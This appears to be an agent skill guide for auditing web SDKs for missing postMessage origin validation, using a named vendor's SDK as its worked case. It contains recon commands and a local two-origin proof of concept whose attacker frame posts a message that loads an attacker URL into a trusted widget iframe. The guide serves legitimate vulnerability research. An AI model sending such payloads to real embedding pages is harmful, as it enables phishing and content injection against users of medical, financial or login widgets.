
# Web SDK / postMessage Trust-Boundary Audit

## When to use
- Target ships an **embeddable script** (an SDK, widget, "drop this <script> on your site") — `*.js` served from an API/CDN host.
- A page (or SDK) registers `window.addEventListener("message", ...)` / `onmessage` and you want to know if it trusts the sender.
- You found a `postMessage` bridge and need to prove whether the receiver checks `event.origin` / `event.source`.
- Bug class: **missing origin validation** → cross-origin UI redressing / content injection / clickjacking-adjacent / data-callback spoofing.

## Why this class pays
Embeddable SDKs are loaded on **partner pages** that usually also host *other* third-party frames (ads, analytics, chat/support, maps, payment). Any one of those frames is a cross-origin window that can `postMessage` to the SDK host window. If the SDK doesn't validate origin, that frame drives the widget. On a **medical / financial / auth** widget this is a pixel-perfect phishing surface.

## Workflow

### 1. Bundle recon (get the exact artifact + hash it)
```bash
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36'
curl -sS -m 20 -A "$UA" -D - -o sdk.js "https://api.TARGET.com/path/sdk.js"
sha256sum sdk.js          # record the hash — it pins the version you audited
grep -oE 'version:"[^"]*"' sdk.js   # find SDK version string
```
Bundles are usually webpack-minified: single letters for identifiers. Don't give up — grep by *string literals* and *method names*, not variable names.

### 2. Enumerate listeners + sinks
```bash
grep -oE '.{80}addEventListener\("message".{80}' sdk.js
grep -oE '.{60}(onMessage|onmessage)[^,;]{0,120}' sdk.js
grep -oE '.{60}(iframe|createElement\("iframe"\)|\.src[=:]).{100}' sdk.js
grep -oE '.{40}(clipboard|writeText|innerHTML|location|onDataReceived|postMessage\().{80}' sdk.js
```
Then dump the router body in full (python slice is cleaner than grep for minified code):
```python
import re; s=open('sdk.js',encoding='utf-8',errors='replace').read()
m=re.search(r'onMessage\s*[:=]\s*function', s); i=m.start(); print(s[i-600:i+2600])
```
**Red flag #1**: the listener/handler never reads `e.origin` or `e.source`. Confirm by grepping the whole handler body for `origin`/`source` — if absent, every message type is unauthenticated.
**Red flag #2**: a `switch(t.type)` where only ONE case (often a redirect helper) calls an allowlist check while the rest act directly.

### 3. Trace payload → sink (this is the finding)
Pick the message type whose payload reaches a dangerous sink. Classic flow in a minified bundle:
```
onMessage(e)  →  case "REQUEST_MODULE_TRANSITION": ctrl.moduleTransition(t.source, t.payload)
moduleTransition(src, p)  →  new Module(config, mon, { module: p.module, ... })
Module ctor   →  this.moduleUrl = n.module            # no validation
Module.url getter → return moduleUrl
iframe.src = module.url                                # attacker-controlled URL rendered
```
Trace it explicitly: payload field → constructor assignment → getter → sink. Grep the ctor and the getter (`get url\(\)\{...\}`) to confirm no validation sits between.

Also check the **allowlist quality** if one exists. A correct host allowlist uses a **leading dot** (`.ada.com`) so `endsWith()` can't be bypassed by `evil-ada.com`; a bare `ada.com` with `endsWith()` IS bypassable (`notada.com`). Report the exact array.

### 4. Prove it — two-origin local PoC harness
You do NOT need the real target. Stand up the SDK exactly as a partner page would, on one origin, and an attacker frame on a **different** origin.

Layout (`scripts/serve.py` is the static server; `templates/` has starters):
```
poc/
  host/index.html        # origin :8000 — loads sdk.js, sets window.<config>, embeds the widget
  attacker/attacker.html # origin :8001 — auto-sends the malicious postMessage to parent
  attacker/evil.html     # origin :8001 — content the attacker wants rendered in the widget
  serve.py
```
```bash
python3 serve.py .           8000   # host  (partner page + sdk.js)
python3 serve.py ./attacker  8001   # attacker origin
```
Attacker frame payload (mirror the exact `source`/`type`/`payload` shape the SDK expects):
```js
parent.postMessage({
  source: "ADA_ASSESSMENT",                 // whatever the SDK's expected source tag is
  type: "REQUEST_MODULE_TRANSITION",
  payload: { module: "http://127.0.0.1:8001/evil.html", moduleProperties: {} }
}, "*");
```
**Make `evil.html` beacon back** (`new Image().src='/beacon?from=evil-iframe'`) — a `200` on `/evil.html` alone proves *fetch*, the beacon proves *execution*.

### 5. Capture evidence (two independent methods)
- **Headless Chromium** — dump rendered DOM + screenshot:
  ```bash
  chromium-browser --headless=new --no-sandbox --disable-gpu --disable-dev-shm-usage \
    --user-data-dir=/tmp/prof --virtual-time-budget=7000 --window-size=1000,720 \
    --dump-dom "http://127.0.0.1:8000/host/index.html" > dom.html
  ```
  Then `grep -oE '<iframe[^>]*>' dom.html` — the widget iframe's `src` must show the attacker URL.
- **Browser tool** — `browser_navigate` to the host page, then read back via JS:
  ```js
  [...document.querySelectorAll('iframe')].map(f=>({id:f.id,src:f.getAttribute('src'),title:f.title}))
  ```
  This is the strongest evidence: `{id:"...assessment-iframe", src:"http://.../evil.html", title:"Symptom Assessment"}`.

### 6. Triage honestly before writing anything
- **What you CAN claim**: cross-origin content injection into a trusted widget = UI redressing / phishing; clipboard write (`navigator.clipboard.writeText(attackerContent)`); forged data-callback (`onDataReceived(attackerPayload)`); forced close/resize.
- **What you must NOT claim unless proven**: account takeover. Check what the SDK *sends* to the widget (`grep postMessage`) — an init message carrying only public config (`customizationId`, `trackingId`, `origin`) is **not** a token leak. State the precondition (needs a cross-origin frame on the embedding page) openly.
- Severity lands **High** for medical/financial/auth UI redressing, not Critical, absent token disclosure.

## Pitfalls
- **Read the target's VDP out-of-scope list BEFORE building the report.** Common exclusions that will sink a finding: *"API token / OAuth secret recoverable in application binaries"*, missing security headers, non-exploitable info disclosure. (Ada's VDP explicitly excludes binary-recoverable secrets AND states requesting a reward violates policy → no payout.)
- **No bounty ≠ no finding.** A good VDP-only disclosure is still worth writing; just tell the user the payout reality before they invest time sending it.
- **Minified bundles have MULTIPLE `onMessage` definitions** (e.g. a user-interaction monitor has its own). Enumerate all of them (`grep -c 'onMessage\s*[:=]\s*function'`) and check each for the origin check — a patched main handler with an unpatched secondary one is still a bug.
- **Snap-confined Chromium (Ubuntu) can silently fail to write a screenshot into `/tmp`** (AppArmor confinement) — write `--screenshot=$HOME/out.png` instead and verify with `file`. Same class of issue: give Chromium a writable `--user-data-dir`.
- Don't `pkill -f serve.py` in the same call you use it to verify — you'll SIGTERM your own shell (exit -15). Kill, then verify in a separate call.
- A `403` from a WAF on most paths while ONE path (e.g. a served `*.html` loader) returns `200` is normal — the exposed loader is often the only entry point to the SDK; follow it.

## Verification
- `grep -oE '<iframe[^>]*>'` on rendered DOM shows the widget iframe `src` = attacker origin.
- Attacker server log shows `GET /evil.html 200` **and** the beacon hit.
- Browser-tool JS read-back confirms the live iframe `src` after the message.
- The `sha256sum` of the exact bundle you analyzed is recorded in the report.

## Support files
- `scripts/serve.py` — minimal static HTTP server (correct `Content-Type` for `.js`/`.html`), used twice on two ports.
- `templates/host-page.html` — partner page that embeds an SDK + sets its config global.
- `templates/attacker-frame.html` — cross-origin frame that fires the malicious `postMessage` on load.
- `references/ada-web-sdk-case.md` — worked end-to-end example (Ada Web SDK v1.0.0): exact minified code path, PoC payload, evidence, VDP outcome.
